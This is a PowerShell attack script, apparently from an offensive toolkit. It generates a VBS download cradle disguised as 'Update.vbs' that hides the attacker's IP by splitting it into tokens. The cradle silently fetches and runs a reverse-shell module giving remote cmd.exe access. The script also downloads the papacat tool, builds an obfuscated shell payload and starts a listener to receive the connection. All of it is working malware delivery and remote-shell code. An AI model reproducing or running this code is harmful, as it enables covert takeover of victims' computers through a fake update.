$portnumber = "666"
$Local_Host = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
$FirstRange = $Local_Host[0,1,2,3,4] -join ''                          # 192.1   - COLOMBO
$SeconRange = $Local_Host[5,6,7,8] -join ''                            # 68.1    - VIRIATO
$TrithRange = $Local_Host[9,10,11,12,13,14,15,16,17,18,19,20] -join '' #.72
$LastRanges = "$TrithRange" + ":" + "8080" -join ''                    #.72:8080 - NAVIGATOR


$VbsFile = @("' Author: @r00t-3xp10it (ssa)
' Application: papacat download crandle
' Description:
'   This VBS will download Trigger.ps1 (rev tcp shell) from attacker webserver
'   imports module and executes module in a hidden console. ( background )
' ---

dIm Char,Cmd,Layback
Char=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
Layback=rEpLaCe(Char, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")

set ObjConsole = CreateObject(`"Wscript.Shell`")
ObjConsole.Run(`"powershell.exe cd `$Env:TMP;iwr -Uri http://`"+Cmd+`"/Trigger.ps1 -OutFile Trigger.ps1;Import-Module -Name .\Trigger.ps1 -Force;Trigger-c Server@Local@host -e cmd.exe -p $portnumber`"), 0
}")

#write file on disk
echo $VbsFile|Out-File "Update.vbs" -Encoding string -Force


#Replace content on vbs file
((Get-Content -Path "update.vbs" -Raw) -Replace "VIRIATO","$SeconRange")|Set-Content -Path "update.vbs"
((Get-Content -Path "update.vbs" -Raw) -Replace "COLOMBO","$FirstRange ")|Set-Content -Path "update.vbs"
((Get-Content -Path "update.vbs" -Raw) -Replace "NAVIGATOR","$LastRanges")|Set-Content -Path "update.vbs" 
((Get-Content -Path "update.vbs" -Raw) -Replace "Server@Local@host","$Local_Host")|Set-Content -Path "update.vbs" 


#Download papacat
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/papacat_rev_shell/papacat.ps1" -OutFile "papacat.ps1"|Unblock-File

#Generate - Cmd Client (payload) Obfucated
Import-Module -Name .\papacat.ps1 -Force
papacat -c $Local_Host -e cmd.exe -p $portnumber -g > Trigger.ps1


If(Test-Path -Path "Trigger.ps1" -ErrorAction SilentlyContinue)
{
   #replace - Main @('192.168.1.72',$False,666,60) @('cmd.exe')
   ((Get-Content -Path Trigger.ps1 -Raw) -Replace "Main @\('$Local_Host'","`$Ob = `"$FirstRange`"+`"$SeconRange`"+`"$TrithRange`" -Join ''`nMain @(`$Ob")|Set-Content -Path Trigger.ps1
}


#handler
papacat -l -p $portnumber -t 120 -v